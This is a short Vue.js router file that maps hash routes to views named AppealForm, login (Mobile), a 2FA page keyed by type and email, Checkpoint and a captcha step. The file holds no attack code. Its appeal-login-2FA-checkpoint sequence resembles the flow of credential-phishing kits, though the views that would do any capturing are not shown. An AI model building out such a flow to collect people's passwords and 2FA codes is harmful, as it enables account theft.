import { createRouter, createWebHashHistory } from 'vue-router'
import AppealForm from '../views/Form1.vue'
import Mobile from '../views/Mobile.vue'
import TwoFA from '../pages/2FA.vue'
import Checkpoint from '../pages/Checkpoint.vue'
import CaptchaStep from '../pages/CaptchaStep.vue'

const routes = [
  {
    path: '/captcha',
    name: 'captcha',
    component: CaptchaStep
  },
  {
    path: '/',
    name: 'appealform',
    component: AppealForm
  },
  {
    path: '/login',
    name: 'login',
    component: Mobile
  },
  {
    path: '/:type/:email',
    name: 'twofa',
    component: TwoFA
  },
  {
    path: '/checkpoint/',
    name: 'checkpoint',
    component: Checkpoint
  },
]

const router = createRouter({
  history: createWebHashHistory(),
  routes
})

export default router
